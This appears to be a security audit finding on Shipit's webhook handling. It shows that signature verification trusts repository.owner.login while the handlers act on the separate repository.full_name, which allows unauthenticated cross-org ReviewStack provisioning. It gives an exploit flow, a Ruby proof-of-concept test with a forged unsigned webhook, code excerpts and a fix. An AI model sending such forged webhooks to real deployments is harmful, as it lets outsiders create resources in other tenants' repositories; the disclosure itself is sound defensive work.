### Title
Webhook signature verification is bound to `repository.owner.login`, while `LabeledHandler`/`ReviewStackAdapter` act on the independent, unsigned `repository.full_name` field, allowing cross-org ReviewStack provisioning - ([File: app/models/shipit/webhooks/handlers/pull_request/labeled_handler.rb])

### Summary
`WebhooksController#verify_signature` picks which org's `webhook_secret` to verify against using `params.dig('repository','owner','login')`, but `LabeledHandler`/`LabelCapturingHandler`/`ReviewStackAdapter` resolve and mutate the target repository using the separate `params.repository.full_name` field from the same attacker-controlled JSON body. Because both fields are read from the same unsigned body and are never checked against each other, an attacker can pick an org with no configured `webhook_secret` for the signature check while naming an entirely different victim org/repo for the actual provisioning logic.

### Finding Description
The broken binding, stated as an equality that the code assumes but never enforces:
`params.dig('repository','owner','login')` (used to select the org for signature verification) `== owner_of(params.repository.full_name)` (used by the handlers to resolve and mutate the target `Repository`).

Trace:
- `WebhooksController#verify_signature` resolves the signing org purely from `repository_owner`, i.e. `params.dig('repository','owner','login') || params.dig('organization','login')`, and calls `Shipit.github(organization: repository_owner).verify_webhook_signature(...)`. [1](#0-0) 
- `GithubApp#verify_webhook_signature` short-circuits to `true` whenever that org has no `webhook_secret` configured: `return true unless webhook_secret`. [2](#0-1) 
- The dummy/multi-org config demonstrates `webhook_secret` is an optional, per-org setting that can legitimately be blank. [3](#0-2) 
- Once signature verification passes (trivially, because the org named in `repository.owner.login` has no secret), `Shipit::Webhooks.for_event('pull_request')` dispatches the whole, attacker-controlled body to `LabeledHandler`, which resolves the actual target repository from a **different** field, `params.repository.full_name`: `Shipit::Repository.from_github_repo_name(params.repository.full_name)`. [4](#0-3) 
- If that repository has `provisioning_behavior_allow_with_label?` and the PR's labels include `provisioning_label_name`, `unarchive?` is true and `stack.unarchive!` is invoked. [5](#0-4) 
- `ReviewStackAdapter#unarchive!` creates a brand-new `ReviewStack` via `create!` when none exists for that PR's environment, using attacker-supplied `pull_request.head.ref`, `params.number`, etc. [6](#0-5) 

Exploit flow: the attacker crafts a raw HTTP POST to `/webhooks` with header `X-Github-Event: pull_request` and a JSON body where `repository.owner.login` is set to an org configured in the Shipit install with no `webhook_secret` (or otherwise trivially bypassable), while `repository.full_name` names a victim org/repo (`victim-org/victim-repo`) that does have review stacks enabled and `provisioning_behavior_allow_with_label`. The PR's `labels` array includes the victim repo's `provisioning_label_name`. `verify_signature` passes because it only checks the secret for the org named in `repository.owner.login`; the handler then provisions a `ReviewStack` for the victim repository/PR named in `repository.full_name`, entirely unauthenticated by GitHub.

Existing guards fail to prevent this because:
- `verify_signature` never cross-checks that `repository.owner.login` matches the owner portion of `repository.full_name`.
- `drop_unhandled_event` and `ExplicitParameters` schemas only validate presence/types of fields, not their mutual consistency.
- `Repository.from_github_repo_name` performs no authorization check against the webhook's verified org; it blindly looks up whatever `full_name` is supplied. [7](#0-6) 

### Impact Explanation
An unauthenticated attacker (or an attacker who only controls a low/no-secret org's webhook path) can trigger creation/unarchiving of a `ReviewStack` for any victim repository registered in the same multi-tenant Shipit instance, provided that repository has review stacks enabled with `allow_with_label` provisioning behavior. This is a record being written for a repository that never validated the request — matching "a payload for one repository mutating another's stack" impact. It is repeatable against any repository configured this way, across tenants sharing the same Shipit deployment, as long as at least one org in the install has no (or a guessable/absent) `webhook_secret`.

### Likelihood Explanation
Preconditions: the multi-tenant Shipit instance must have at least one configured GitHub org with `webhook_secret` unset (a documented, supported configuration state, not an edge case), and the victim repository must have `review_stacks_enabled` and `provisioning_behavior_allow_with_label` set (an intentional opt-in feature for review-stack automation). Attacker cost is a single crafted HTTP POST with no valid GitHub signature and no privileged credentials, fully within the "unprivileged internet attacker" threat model. This is trivially repeatable against any qualifying victim repo.

### Recommendation
Bind signature verification's organization to the same field used for actual repository resolution: derive `repository_owner` and `repository.full_name`'s owner from a single canonical source, and reject the request (`head 422`) if they diverge. Additionally, do not allow `verify_webhook_signature` to return `true` unconditionally when `webhook_secret` is blank in environments that also host other orgs with configured secrets — either require all orgs to configure a secret, or scope repository resolution in handlers to only repositories owned by the org that passed signature verification (e.g., assert `repository.owner == repository_owner` before dispatching to handlers).

```ruby
test "cross-org repository_owner mismatch allows unauthorized ReviewStack provisioning" do
  victim_repo = shipit_repositories(:shipit) # has review_stacks_enabled, provisioning_behavior_allow_with_label
  victim_repo.update!(review_stacks_enabled: true, provisioning_behavior: 'allow_with_label', provisioning_label_name: 'ship-it')

  # simulate org "no-secret-org" configured with webhook_secret: nil
  Shipit.stubs(:github).with(organization: 'no-secret-org').returns(
    Shipit::GithubApp.new('no-secret-org', {})
  )

  body = {
    action: 'labeled',
    number: 999,
    pull_request: {
      id: 1, number: 999, url: 'http://x', title: 't', state: 'open',
      additions: 1, deletions: 0,
      head: { sha: 'a' * 40, ref: 'feature' },
      user: { login: 'attacker' },
      assignees: [],
      labels: [{ name: 'ship-it' }]
    },
    repository: {
      owner: { login: 'no-secret-org' }, # used ONLY for signature org lookup
      full_name: victim_repo.full_name    # used by LabeledHandler to target the victim
    },
    sender: { login: 'attacker' }
  }.to_json

  request.headers['X-Github-Event'] = 'pull_request'
  request.headers['X-Hub-Signature'] = 'sha1=deadbeef' # arbitrary, invalid signature

  assert_difference -> { victim_repo.review_stacks.count }, 1 do
    post :create, body: body, as: :json
  end
  assert_response :ok
end
```

```ruby
    def verify_webhook_signature(signature, message)
      return true unless webhook_secret

      algorithm, signature = signature.split("=", 2)
      return false unless algorithm == 'sha1'

      SecureCompare.secure_compare(signature, OpenSSL::HMAC.hexdigest(algorithm, webhook_secret, message))
    end
```

```ruby
            return unless respond_to_label_change?

            handle
          end

          def handle
            if archive?
              stack.archive!
            elsif unarchive?
              stack.unarchive!
            end

            stack
          end

          def stack
            @stack ||=
              Shipit::Webhooks::Handlers::PullRequest::ReviewStackAdapter
              .new(params, scope: repository.review_stacks)
          end

          def repository
            @repository ||= Shipit::Repository.from_github_repo_name(params.repository.full_name) ||
                            Shipit::NullRepository.new
          end

          def pull_request
            params.pull_request
          end

          def pull_request_state
            pull_request.state
          end

          def respond_to_label_change?
            params.action == "labeled" &&
              pull_request_state == "open" &&
              repository.review_stacks_enabled &&
              (archive? || unarchive?)
          end

          def archive?
            (repository.provisioning_behavior_allow_with_label? && !pull_request_has_provisioning_label?) ||
              (repository.provisioning_behavior_prevent_with_label? && pull_request_has_provisioning_label?)
          end

          def unarchive?
            (repository.provisioning_behavior_allow_with_label? && pull_request_has_provisioning_label?) ||
              (repository.provisioning_behavior_prevent_with_label? && !pull_request_has_provisioning_label?)
          end
```

```ruby
          def unarchive!(*args, &block)
            if stack.blank?
              Rails.logger.info(
                "Processing #{action} event for #{repo_name} PR #{pr_number} but no ReviewStack exists. Creating."
              )
              return create!
            end
            return unless stack.archived?

            stack.transaction do
              Shipit::ReviewStackProvisioningQueue.add(stack)
              stack.unarchive!(*args, &block)
            end
          end

          def user
            @user ||= Shipit::User.find_or_create_by_login!(params.sender["login"])
          end

          private

          attr_reader :params, :scope

          def action
            params.action
          end

          def repo_name
            params.repository["full_name"]
          end

          def pr_number
            params.number
          end

          def create!
            ReviewStack.transaction do
              stack = scope.create!(stack_attributes)
              stack
                .build_pull_request
                .update!(
                  github_pull_request: params.pull_request
                )
            end

            Shipit::ReviewStackProvisioningQueue.add(stack)

            @stack = stack
          end

          def stack_attributes
            {
              branch: params.pull_request.head.ref,
              environment:,
              ignore_ci: false,
              continuous_deployment: false
            }
```
